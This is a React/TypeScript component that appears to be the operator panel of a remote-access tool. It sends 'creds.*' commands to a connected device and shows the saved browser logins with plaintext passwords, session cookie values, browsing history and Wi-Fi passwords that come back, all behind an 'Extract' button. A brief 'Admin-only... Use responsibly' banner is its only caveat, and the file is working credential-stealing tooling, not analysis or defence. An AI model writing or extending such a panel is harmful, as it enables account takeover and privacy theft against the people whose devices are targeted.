import { useState } from "react";
import { toast } from "sonner";
import { useDeviceCommands } from "@/hooks/use-device-commands";
import { Chrome, Key, History, Wifi, RefreshCw, AlertTriangle } from "lucide-react";

type CookieEntry = { domain: string; name: string; value: string; path: string; expires: string };
type LoginEntry = { url: string; username: string; password: string };
type HistoryEntry = { url: string; title: string; visit_time: string };

export function CredentialsPanel({ deviceId }: { deviceId: string }) {
  const { send, connected } = useDeviceCommands(deviceId);
  const [sub, setSub] = useState<"cookies" | "logins" | "history" | "wifi">("cookies");
  const [cookies, setCookies] = useState<CookieEntry[]>([]);
  const [logins, setLogins] = useState<LoginEntry[]>([]);
  const [history, setHistory] = useState<HistoryEntry[]>([]);
  const [wifiPasswords, setWifiPasswords] = useState<{ ssid: string; password: string }[]>([]);
  const [busy, setBusy] = useState(false);

  const load = async () => {
    setBusy(true);
    try {
      if (sub === "cookies") {
        const r = await send("creds.browser.cookies");
        setCookies((r.result?.cookies as CookieEntry[]) ?? []);
      } else if (sub === "logins") {
        const r = await send("creds.browser.logins");
        setLogins((r.result?.logins as LoginEntry[]) ?? []);
      } else if (sub === "history") {
        const r = await send("creds.browser.history");
        setHistory((r.result?.entries as HistoryEntry[]) ?? []);
      } else if (sub === "wifi") {
        const r = await send("creds.wifi");
        setWifiPasswords((r.result?.networks as { ssid: string; password: string }[]) ?? []);
      }
    } catch (e: any) {
      toast.error(e.message);
    } finally {
      setBusy(false);
    }
  };

  const subtabs = [
    { key: "cookies" as const, label: "Cookies", icon: Chrome },
    { key: "logins" as const, label: "Logins", icon: Key },
    { key: "history" as const, label: "History", icon: History },
    { key: "wifi" as const, label: "Wi-Fi Passwords", icon: Wifi },
  ];

  return (
    <div className="space-y-4">
      <div className="rounded-lg border border-amber-500/30 bg-amber-500/10 p-3 text-xs text-amber-200">
        <div className="flex items-center gap-2">
          <AlertTriangle className="h-4 w-4" />
          <span className="font-semibold">Admin-only module</span>
        </div>
        <p className="mt-1">
          Credential extraction requires AGENT_ALLOW_CREDS build flag. Use responsibly.
        </p>
      </div>

      <div className="flex items-center gap-2">
        {subtabs.map((t) => {
          const Icon = t.icon;
          return (
            <button
              key={t.key}
              onClick={() => setSub(t.key)}
              className={`inline-flex items-center gap-1.5 rounded-md px-3 py-1.5 text-xs font-medium transition ${
                sub === t.key
                  ? "bg-primary/10 text-primary"
                  : "text-muted-foreground hover:bg-accent hover:text-foreground"
              }`}
            >
              <Icon className="h-3 w-3" /> {t.label}
            </button>
          );
        })}
        <button
          onClick={load}
          disabled={!connected || busy}
          className="ml-auto inline-flex items-center gap-1 rounded-md border border-border/60 px-2.5 py-1.5 text-xs transition hover:bg-accent disabled:opacity-40"
        >
          <RefreshCw className={`h-3 w-3 ${busy ? "animate-spin" : ""}`} /> Extract
        </button>
      </div>

      {sub === "cookies" && (
        <div className="overflow-hidden rounded-xl border border-border/60 bg-card/60">
          <table className="w-full text-sm">
            <thead className="bg-muted/30 text-left text-xs uppercase tracking-wider text-muted-foreground">
              <tr>
                <th className="px-4 py-2.5 font-medium">Domain</th>
                <th className="px-4 py-2.5 font-medium">Name</th>
                <th className="px-4 py-2.5 font-medium">Value</th>
                <th className="px-4 py-2.5 font-medium">Expires</th>
              </tr>
            </thead>
            <tbody>
              {cookies.length === 0 && (
                <tr><td colSpan={4} className="px-4 py-8 text-center text-muted-foreground">{busy ? "extracting…" : "no data"}</td></tr>
              )}
              {cookies.map((c, i) => (
                <tr key={i} className="border-t border-border/40 hover:bg-muted/20">
                  <td className="px-4 py-2 text-xs">{c.domain}</td>
                  <td className="px-4 py-2 font-mono text-xs">{c.name}</td>
                  <td className="max-w-40 truncate px-4 py-2 font-mono text-xs text-muted-foreground">{c.value}</td>
                  <td className="px-4 py-2 text-xs text-muted-foreground">{c.expires}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {sub === "logins" && (
        <div className="overflow-hidden rounded-xl border border-border/60 bg-card/60">
          <table className="w-full text-sm">
            <thead className="bg-muted/30 text-left text-xs uppercase tracking-wider text-muted-foreground">
              <tr>
                <th className="px-4 py-2.5 font-medium">URL</th>
                <th className="px-4 py-2.5 font-medium">Username</th>
                <th className="px-4 py-2.5 font-medium">Password</th>
              </tr>
            </thead>
            <tbody>
              {logins.length === 0 && (
                <tr><td colSpan={3} className="px-4 py-8 text-center text-muted-foreground">{busy ? "extracting…" : "no data"}</td></tr>
              )}
              {logins.map((l, i) => (
                <tr key={i} className="border-t border-border/40 hover:bg-muted/20">
                  <td className="max-w-48 truncate px-4 py-2 text-xs">{l.url}</td>
                  <td className="px-4 py-2 font-mono text-xs">{l.username}</td>
                  <td className="px-4 py-2 font-mono text-xs text-muted-foreground">{l.password}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {sub === "history" && (
        <div className="overflow-hidden rounded-xl border border-border/60 bg-card/60">
          <table className="w-full text-sm">
            <thead className="bg-muted/30 text-left text-xs uppercase tracking-wider text-muted-foreground">
              <tr>
                <th className="px-4 py-2.5 font-medium">URL</th>
                <th className="px-4 py-2.5 font-medium">Title</th>
                <th className="px-4 py-2.5 font-medium">Time</th>
              </tr>
            </thead>
            <tbody>
              {history.length === 0 && (
                <tr><td colSpan={3} className="px-4 py-8 text-center text-muted-foreground">{busy ? "extracting…" : "no data"}</td></tr>
              )}
              {history.map((h, i) => (
                <tr key={i} className="border-t border-border/40 hover:bg-muted/20">
                  <td className="max-w-48 truncate px-4 py-2 text-xs">{h.url}</td>
                  <td className="px-4 py-2 text-xs">{h.title}</td>
                  <td className="px-4 py-2 text-xs text-muted-foreground">{h.visit_time}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {sub === "wifi" && (
        <div className="overflow-hidden rounded-xl border border-border/60 bg-card/60">
          <table className="w-full text-sm">
            <thead className="bg-muted/30 text-left text-xs uppercase tracking-wider text-muted-foreground">
              <tr>
                <th className="px-4 py-2.5 font-medium">SSID</th>
                <th className="px-4 py-2.5 font-medium">Password</th>
              </tr>
            </thead>
            <tbody>
              {wifiPasswords.length === 0 && (
                <tr><td colSpan={2} className="px-4 py-8 text-center text-muted-foreground">{busy ? "extracting…" : "no data"}</td></tr>
              )}
              {wifiPasswords.map((w, i) => (
                <tr key={i} className="border-t border-border/40 hover:bg-muted/20">
                  <td className="px-4 py-2 font-medium">{w.ssid}</td>
                  <td className="px-4 py-2 font-mono text-xs">{w.password || "—"}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
